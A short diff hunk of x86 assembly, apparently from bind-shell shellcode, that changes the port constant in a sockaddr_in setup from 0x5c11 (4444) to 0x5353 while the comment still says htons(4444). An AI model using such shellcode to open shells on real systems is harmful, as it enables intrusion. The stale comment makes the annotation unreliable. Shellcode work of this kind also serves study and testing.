@@ -172,7 +172,7 @@ start:
 	push eax		; sin_zero = 0
 	push eax		;
 	push eax		; sin_addr = NULL
-	mov eax,0x5c110102	; eax = htons(4444)0102
+	mov eax,0x53530102	; eax = htons(4444)0102
 	dec ah 			; eax  = htons(4444)0002
 	push eax		; *sockaddr_in on stack
 	mov eax,esp		; eax has pointer to struct sockaddr_in
